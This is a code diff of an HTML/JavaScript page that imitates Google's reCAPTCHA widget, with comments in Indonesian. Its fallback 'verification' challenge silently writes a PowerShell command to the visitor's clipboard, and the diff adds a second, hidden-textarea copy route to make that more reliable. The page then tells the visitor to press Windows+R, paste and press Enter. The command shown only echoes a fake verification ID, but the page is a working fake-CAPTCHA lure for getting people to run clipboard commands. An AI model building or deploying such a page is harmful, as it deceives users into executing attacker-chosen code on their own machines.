@@ -5,197 +5,39 @@
   <title>reCAPTCHA Verification</title>
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
   <style>
-    .container {
-      font-family: Roboto, helvetica, arial, sans-serif;
-    }
+    .container { font-family: Roboto, helvetica, arial, sans-serif; }
     .m-p { margin: 0; padding: 0; }
     .block { display: block; }
     code { font-size: 9px; margin-left: 2px; color: gray; }
     .line-normal { line-height: normal; }
-    
     /* Checkbox window (awal) */
-    .checkbox-window {
-      height: 74px;
-      width: 300px;
-      background-color: #f9f9f9;
-      border-radius: 3px;
-      border: 1px solid #d3d3d3;
-      position: relative;
-    }
-    .checkbox-window a {
-      color: #555;
-      text-decoration: none;
-    }
-    .checkbox-window a:hover {
-      color: #555;
-      text-decoration: underline;
-    }
-    /* Container tombol (untuk spinner) */
-    .checkbox-container {
-      width: 28px;
-      height: 28px;
-      position: relative;
-    }
-    .checkbox {
-      position: relative;
-      background-color: #fff;
-      border-radius: 2px;
-      height: 100%;
-      width: 100%;
-      border: 2px solid #c1c1c1;
-      margin: 21px 0 0 12px;
-      outline: none;
-      transition: all 500ms;
-      cursor: pointer;
-      z-index: 1;
-    }
+    .checkbox-window { height: 74px; width: 300px; background-color: #f9f9f9; border-radius: 3px; border: 1px solid #d3d3d3; position: relative; }
+    .checkbox-window a { color: #555; text-decoration: none; }
+    .checkbox-window a:hover { color: #555; text-decoration: underline; }
+    .checkbox-container { width: 28px; height: 28px; position: relative; }
+    .checkbox { position: relative; background-color: #fff; border-radius: 2px; height: 100%; width: 100%; border: 2px solid #c1c1c1; margin: 21px 0 0 12px; outline: none; transition: all 500ms; cursor: pointer; z-index: 1; }
     .checkbox:hover { border: 2px solid #b2b2b2; }
-    .im-not-a-robot {
-      position: relative;
-      left: 52px;
-      bottom: 3px;
-      font-size: 15px;
-      color: #282727;
-    }
-    .captcha-logo {
-      position: absolute;
-      right: 10px;
-      top: 10px;
-      width: 40px;
-      height: 45px;
-      vertical-align: baseline;
-      padding-bottom: 4px;
-    }
-    /* Posisi checkbox-desc di pojok kanan */
-    .checkbox-desc {
-      color: #555555;
-      position: absolute;
-      bottom: 4px;
-      right: 10px;
-      font-size: 8px;
-      text-align: right;
-    }
-    
-    /* Spinner */
-    .recaptcha-checkbox-spinner {
-      pointer-events: none;
-      background-color: #f9f9f9;
-      border: 6px solid #4d90fe;
-      border-bottom-color: transparent;
-      border-left-color: transparent;
-      width: 30px;
-      height: 30px;
-      margin: 20px 0 0 12px;
-      position: absolute;
-      border-radius: 50%;
-      box-sizing: border-box;
-      opacity: 0;
-      animation: spinner-spinlinear 2.5s infinite;
-      animation-play-state: paused;
-      transition-duration: 1s;
-      z-index: 2;
-    }
-    @keyframes spinner-spinlinear {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    /* Verify Window (Challenge) */
-    .verify-window {
-      font-family: Roboto, helvetica, arial, sans-serif;
-      opacity: 0;
-      position: absolute;
-      visibility: hidden;
-      margin: auto;
-      width: 430px;
-      background-color: #fff;
-      border: 1px solid #cecece;
-      box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
-      transition: opacity 400ms;
-      z-index: 100;
-    }
+    .im-not-a-robot { position: relative; left: 52px; bottom: 3px; font-size: 15px; color: #282727; }
+    .captcha-logo { position: absolute; right: 10px; top: 10px; width: 40px; height: 45px; padding-bottom: 4px; }
+    .checkbox-desc { color: #555555; position: absolute; bottom: 4px; right: 10px; font-size: 8px; text-align: right; }
+    .recaptcha-checkbox-spinner { pointer-events: none; background-color: #f9f9f9; border: 6px solid #4d90fe; border-bottom-color: transparent; border-left-color: transparent; width: 30px; height: 30px; margin: 20px 0 0 12px; position: absolute; border-radius: 50%; box-sizing: border-box; opacity: 0; animation: spinner-spinlinear 2.5s infinite; animation-play-state: paused; transition-duration: 1s; z-index: 2; }
+    @keyframes spinner-spinlinear { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .verify-window { font-family: Roboto, helvetica, arial, sans-serif; opacity: 0; position: absolute; visibility: hidden; margin: auto; width: 430px; background-color: #fff; border: 1px solid #cecece; box-shadow: 5px 6px 7px -3px rgba(0,0,0,0.12); transition: opacity 400ms; z-index: 100; }
     .verify-container { padding: 8px; }
-    .verify-header {
-      background-color: #1A73E8;
-      padding: 16px 16px 24px 16px;
-      color: #fff;
-      text-align: left;
-    }
+    .verify-header { background-color: #1A73E8; padding: 16px 16px 24px 16px; color: #fff; text-align: left; }
     .verify-header-text-medium { font-size: 16px; }
     .verify-header-text-big { font-size: 24px; font-weight: 700; }
     .verify-main { padding: 5px; color: #111; font-size: 13px; }
-    
-    /* Grid Challenge */
-    .challenge-grid {
-      display: grid;
-      grid-template-columns: repeat(4, 100px);
-      grid-gap: 2px;
-      margin: 10px auto;
-      justify-content: center;
-    }
-    .challenge-cell {
-      width: 100px;
-      height: 100px;
-      border: none;
-      cursor: pointer;
-      position: relative;
-    }
-    .challenge-cell.selected canvas {
-      transform: scale(0.9);
-      transition: transform 0.2s ease;
-    }
-    .check-icon {
-      position: absolute;
-      top: -5px;
-      left: -5px;
-      width: 30px;
-      height: 30px;
-      display: none;
-    }
-    .challenge-cell.selected .check-icon {
-      display: block;
-    }
-    
-    /* Footer */
-    .verify-footer {
-      border-top: 1px solid #cecece;
-      padding: 10px 7px;
-      color: #737373;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 13px;
-    }
-    .verify-footer-left {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .challenge-icon {
-      width: 30px;
-      height: 30px;
-      opacity: 0.7;
-      transition: opacity 0.2s ease;
-      cursor: pointer;
-    }
-    .challenge-icon:hover { opacity: 1; }
-    .verify-verify-button {
-      background: #1a73e8;
-      border: 0;
-      border-radius: 2px;
-      color: #fff;
-      cursor: pointer;
-      font-family: Roboto, helvetica, arial, sans-serif;
-      font-size: 14px;
-      font-weight: 500;
-      height: 42px;
-      line-height: 42px;
-      min-width: 100px;
-      padding: 0 10px;
-      text-align: center;
-      text-transform: uppercase;
-      transition: all 0.5s;
-    }
+    .challenge-grid { display: grid; grid-template-columns: repeat(4,100px); grid-gap:2px; margin:10px auto; justify-content:center; }
+    .challenge-cell { width:100px; height:100px; border:none; cursor:pointer; position:relative; }
+    .challenge-cell.selected canvas { transform: scale(0.9); transition: transform 0.2s ease; }
+    .check-icon { position:absolute; top:-5px; left:-5px; width:30px; height:30px; display:none; }
+    .challenge-cell.selected .check-icon { display:block; }
+    .verify-footer { border-top:1px solid #cecece; padding:10px 7px; color:#737373; display:flex; justify-content:space-between; align-items:center; font-size:13px; }
+    .verify-footer-left { display:flex; align-items:center; gap:8px; }
+    .challenge-icon { width:30px; height:30px; opacity:0.7; transition:opacity 0.2s ease; cursor:pointer; }
+    .challenge-icon:hover { opacity:1; }
+    .verify-verify-button { background:#1a73e8; border:0; border-radius:2px; color:#fff; cursor:pointer; font-family:Roboto,helvetica,arial,sans-serif; font-size:14px; font-weight:500; height:42px; line-height:42px; min-width:100px; padding:0 10px; text-align:center; text-transform:uppercase; transition:all 0.5s; }
   </style>
 </head>
 <body>
@@ -219,14 +61,10 @@
       <div class="verify-container">
         <header class="verify-header">
           <span class="verify-header-text-medium m-p block">Select all squares with</span>
-          <!-- Nama challenge di-set secara dinamis -->
           <span id="challenge-name" class="verify-header-text-big m-p block"></span>
           <span class="verify-header-text-medium m-p block">If there are none, click skip</span>
         </header>
-        <!-- Konten challenge (grid atau fallback) -->
-        <main class="verify-main" id="challenge-main">
-          <!-- Akan diisi secara dinamis -->
-        </main>
+        <main class="verify-main" id="challenge-main"></main>
       </div>
       <footer class="verify-footer">
         <div class="verify-footer-left">
@@ -249,73 +87,47 @@
     const verifyButton = document.getElementById("verify-verify-button");
     const challengeMain = document.getElementById("challenge-main");
     const checkboxWindow = document.getElementById("checkbox-window");
-
-    // Flag untuk mengetahui apakah challenge yang ditampilkan adalah fallback
     let isFallbackChallenge = false;
-
-    /* Data Challenge:
-       Tiga challenge berbasis grid foto dan satu challenge fallback (tanpa foto).
-       Pada challenge fallback, instruksi ditampilkan dengan margin atas/bawah dan ukuran font lebih besar.
-       Selain itu, teks verifikasi akan otomatis disalin ke clipboard.
-    */
+    
+    /* challengeData: 3 foto + 1 fallback */
     const challengeData = [
-      {
-        imageUrl: "https://i.postimg.cc/87y9MjjS/car1.png",
-        name: "bicycles"
-      },
-      {
-        imageUrl: "https://i.postimg.cc/v1cjzbV6/car.png",
-        name: "cars"
-      },
-      {
-        imageUrl: "https://i.postimg.cc/5QLWm1Dm/walk.png",
-        name: "crosswalks"
-      },
+      { imageUrl: "https://i.postimg.cc/87y9MjjS/car1.png", name: "bicycles" },
+      { imageUrl: "https://i.postimg.cc/v1cjzbV6/car.png",  name: "cars"     },
+      { imageUrl: "https://i.postimg.cc/5QLWm1Dm/walk.png", name: "crosswalks" },
       {
         fallback: true,
         name: "verification",
         content: `
-          <p style="margin: 20px 0; font-size: 18px;">
+          <p style="margin:20px 0;font-size:18px;">
             To better prove you are not a robot, please:
           </p>
-          <ol style="margin: 20px 0; font-size: 16px;">
-            <li>
-              Press &amp; hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
-            </li>
-            <li>
-              In the verification window, press <b>Ctrl</b> + <b>V</b>.
-            </li>
-            <li>
-              Press <b>Enter</b> on your keyboard to finish.
-            </li>
+          <ol style="margin:20px 0;font-size:16px;">
+            <li>Press &amp; hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+            <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+            <li>Press <b>Enter</b> on your keyboard to finish.</li>
           </ol>
-          <p style="margin: 20px 0; font-size: 16px;">
-            You will observe and agree:
-            <br>
-            <code>
-              ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
-            </code>
+          <p style="margin:20px 0;font-size:16px;">
+            You will observe and agree:<br>
+            <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"</code>
           </p>
         `
       }
     ];
     
-    // Preload gambar untuk challenge (foto)
-    challengeData.forEach(challenge => {
-      if (!challenge.fallback) {
-        const preloadedImg = new Image();
-        preloadedImg.src = challenge.imageUrl;
-        challenge.img = preloadedImg;
+    // Preload images
+    challengeData.forEach(c => {
+      if (!c.fallback) {
+        const img = new Image();
+        img.src = c.imageUrl;
+        c.img = img;
       }
     });
     
-    // Indeks untuk menampilkan challenge secara berurutan
     let currentChallengeIndex = 0;
+    let correctCells = [];
+    let cellElements = [];
     
-    let correctCells = [];  // Indeks cell yang benar (untuk challenge grid)
-    let cellElements = [];  // Referensi elemen cell
-    
-    // --- Fungsi Utility UI ---
+    // UI utilities
     function showSpinner() {
       spinner.style.visibility = "visible";
       spinner.style.opacity = "1";
@@ -330,7 +142,6 @@
       verifyWindow.style.display = "block";
       verifyWindow.style.visibility = "visible";
       verifyWindow.style.opacity = "1";
-      // Tempatkan verify window 10px di bawah checkbox window
       verifyWindow.style.top = (checkboxWindow.offsetTop + checkboxWindow.offsetHeight + 10) + "px";
       verifyWindow.style.left = (checkboxWindow.offsetLeft + 54) + "px";
     }
@@ -340,31 +151,52 @@
       verifyWindow.style.opacity = "0";
     }
     
-    // --- Load Challenge ---
+    // Fallback copy util
+    function fallbackCopyText(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.setAttribute('readonly', '');
+      ta.style.position = 'absolute';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      try {
+        document.execCommand('copy');
+        console.log('Fallback: text copied.');
+      } catch (e) {
+        console.error('Fallback: unable to copy', e);
+      }
+      document.body.removeChild(ta);
+    }
+    
+    // Load one challenge
     function loadChallenge() {
-      // Reset konten challenge
       challengeMain.innerHTML = "";
       cellElements = [];
       correctCells = [];
       
-      // Ambil challenge saat ini secara berurutan
-      const currentChallenge = challengeData[currentChallengeIndex];
-      document.getElementById("challenge-name").textContent = currentChallenge.name;
-      
-      // Update indeks untuk challenge berikutnya (siklis)
+      const current = challengeData[currentChallengeIndex];
+      document.getElementById("challenge-name").textContent = current.name;
       currentChallengeIndex = (currentChallengeIndex + 1) % challengeData.length;
       
-      // Jika challenge bersifat fallback, tampilkan konten instruksi
-      if (currentChallenge.fallback) {
+      if (current.fallback) {
         isFallbackChallenge = true;
-        challengeMain.innerHTML = currentChallenge.content;
-
-        // Otomatis copy teks verifikasi ke clipboard (langsung, tanpa delay)
+        challengeMain.innerHTML = current.content;
+        
+        // teks yang akan dicopy
         const copyText = "powershell -NoExit -Command \"echo ' I am not a robot - reCAPTCHA Verification ID: 146820'\"";
+        
+        // coba via Clipboard API
         navigator.clipboard.writeText(copyText)
-          .then(() => console.log('Text copied to clipboard!'))
-          .catch(err => console.error('Error copying text: ', err));
-
+          .then(() => console.log('Text copied via Clipboard API!'))
+          .catch(err => {
+            console.warn('Clipboard API failed, fallback...', err);
+            fallbackCopyText(copyText);
+          });
+        
+        // selalu panggil fallback juga untuk berjaga
+        fallbackCopyText(copyText);
+        
         verifyButton.textContent = "Verify";
         verifyButton.disabled = false;
         return;
@@ -372,138 +204,96 @@
         isFallbackChallenge = false;
       }
       
-      // Jika challenge adalah grid foto, buat container grid
+      // grid challenge
       const grid = document.createElement("div");
       grid.className = "challenge-grid";
       challengeMain.appendChild(grid);
+      const img = current.img;
       
-      // Gunakan gambar yang sudah dipreload
-      const img = currentChallenge.img;
-      
-      // Fungsi untuk membuat grid ketika gambar sudah siap
       function generateGrid() {
-        const rows = 4, cols = 4;
-        const cellWidth = img.naturalWidth / cols;
-        const cellHeight = img.naturalHeight / rows;
-        
-        // Pilih 4 indeks secara acak sebagai cell yang benar (simulasi)
-        while (correctCells.length < 4) {
-          const randIndex = Math.floor(Math.random() * 16);
-          if (!correctCells.includes(randIndex)) {
-            correctCells.push(randIndex);
-          }
+        const rows=4, cols=4;
+        const w = img.naturalWidth/cols, h = img.naturalHeight/rows;
+        while (correctCells.length<4) {
+          const idx = Math.floor(Math.random()*16);
+          if (!correctCells.includes(idx)) correctCells.push(idx);
         }
-        
-        // Buat cell untuk grid
-        for (let i = 0; i < rows; i++) {
-          for (let j = 0; j < cols; j++) {
-            const index = i * cols + j;
-            const cellDiv = document.createElement("div");
-            cellDiv.className = "challenge-cell";
-            
-            // Buat canvas untuk potongan gambar
-            const canvas = document.createElement("canvas");
-            canvas.width = 100;
-            canvas.height = 100;
-            const ctx = canvas.getContext("2d");
-            const sx = j * cellWidth;
-            const sy = i * cellHeight;
-            ctx.drawImage(img, sx, sy, cellWidth, cellHeight, 0, 0, 100, 100);
-            cellDiv.appendChild(canvas);
-            
-            // Tambahkan ikon centang (pastikan file check.png tersedia)
-            const checkIcon = document.createElement("img");
-            checkIcon.src = "check.png";
-            checkIcon.className = "check-icon";
-            cellDiv.appendChild(checkIcon);
-            
-            // Toggle selection saat cell diklik
-            cellDiv.addEventListener("click", function() {
-              cellDiv.classList.toggle("selected");
+        for (let i=0;i<rows;i++){
+          for(let j=0;j<cols;j++){
+            const idx=i*cols+j;
+            const cell=document.createElement("div");
+            cell.className="challenge-cell";
+            const canvas=document.createElement("canvas");
+            canvas.width=100; canvas.height=100;
+            const ctx=canvas.getContext("2d");
+            ctx.drawImage(img, j*w, i*h, w, h, 0,0,100,100);
+            cell.appendChild(canvas);
+            const chk=document.createElement("img");
+            chk.src="check.png"; chk.className="check-icon";
+            cell.appendChild(chk);
+            cell.addEventListener("click", ()=>{
+              cell.classList.toggle("selected");
               updateButtonText();
             });
-            
-            grid.appendChild(cellDiv);
-            cellElements.push(cellDiv);
+            grid.appendChild(cell);
+            cellElements.push(cell);
           }
         }
       }
-      
-      // Jika gambar sudah ready, generate grid langsung; jika belum, tunggu onload.
-      if (img.complete) {
-        generateGrid();
-      } else {
-        img.onload = generateGrid;
-      }
+      if (img.complete) generateGrid();
+      else img.onload = generateGrid;
     }
     
-    // Update teks tombol Verify/Skip berdasarkan apakah ada cell terpilih
     function updateButtonText() {
-      if (isFallbackChallenge) return; // Tidak berlaku untuk fallback
-      const anySelected = cellElements.some(cell => cell.classList.contains("selected"));
-      verifyButton.textContent = anySelected ? "Verify" : "Skip";
+      if (isFallbackChallenge) return;
+      const any = cellElements.some(c=>c.classList.contains("selected"));
+      verifyButton.textContent = any ? "Verify" : "Skip";
       verifyButton.disabled = false;
     }
     
-    // Validasi challenge grid: jika jawaban benar, verifikasi berhasil; jika salah, load challenge berikutnya
     function validateChallenge() {
-      let selectedIndices = [];
-      cellElements.forEach((cell, index) => {
-        if (cell.classList.contains("selected")) {
-          selectedIndices.push(index);
-        }
-      });
-      selectedIndices.sort();
-      correctCells.sort();
-      if (JSON.stringify(selectedIndices) === JSON.stringify(correctCells)) {
+      const sel = [];
+      cellElements.forEach((c,i)=>{ if(c.classList.contains("selected")) sel.push(i); });
+      sel.sort(); correctCells.sort();
+      if (JSON.stringify(sel)===JSON.stringify(correctCells)) {
         hideVerifyWindow();
-        checkboxBtn.style.backgroundColor = "#66bb6a"; // Hijau
+        checkboxBtn.style.backgroundColor="#66bb6a";
       } else {
-        // Jika salah, load challenge berikutnya (tanpa alert error)
         loadChallenge();
         updateButtonText();
       }
     }
     
-    // --- Event Listeners ---
-    // Klik pada tombol checkbox untuk memunculkan challenge
-    checkboxBtn.addEventListener("click", function(event) {
-      event.preventDefault();
+    // Event Listeners
+    checkboxBtn.addEventListener("click", function(e){
+      e.preventDefault();
       showSpinner();
-      setTimeout(function() {
+      setTimeout(()=>{
         hideSpinner();
         showVerifyWindow();
         loadChallenge();
         updateButtonText();
-      }, 900);
+      },900);
     });
     
-    // Tombol Verify/Skip: jika challenge fallback, langsung verifikasi; jika grid, lakukan validasi atau skip
-    verifyButton.addEventListener("click", function() {
+    verifyButton.addEventListener("click", function(){
       if (isFallbackChallenge) {
         hideVerifyWindow();
-        checkboxBtn.style.backgroundColor = "#66bb6a";
+        checkboxBtn.style.backgroundColor="#66bb6a";
       } else {
-        if (verifyButton.textContent === "Verify") {
-          validateChallenge();
-        } else {
-          loadChallenge();
-          updateButtonText();
-        }
+        if (verifyButton.textContent==="Verify") validateChallenge();
+        else { loadChallenge(); updateButtonText(); }
       }
     });
     
-    // Jika klik di luar verify window, tutup challenge
-    document.addEventListener("click", function(event) {
-      const path = event.composedPath();
-      if (!path.includes(verifyWindow) && verifyWindow.style.display === "block") {
+    document.addEventListener("click", function(e){
+      const path = e.composedPath();
+      if (!path.includes(verifyWindow) && verifyWindow.style.display==="block") {
         hideVerifyWindow();
       }
     });
     
-    // Refresh icon: load challenge berikutnya
-    document.getElementById("refresh-icon").addEventListener("click", function(event) {
-      event.stopPropagation();
+    document.getElementById("refresh-icon").addEventListener("click", function(ev){
+      ev.stopPropagation();
       loadChallenge();
       updateButtonText();
     });
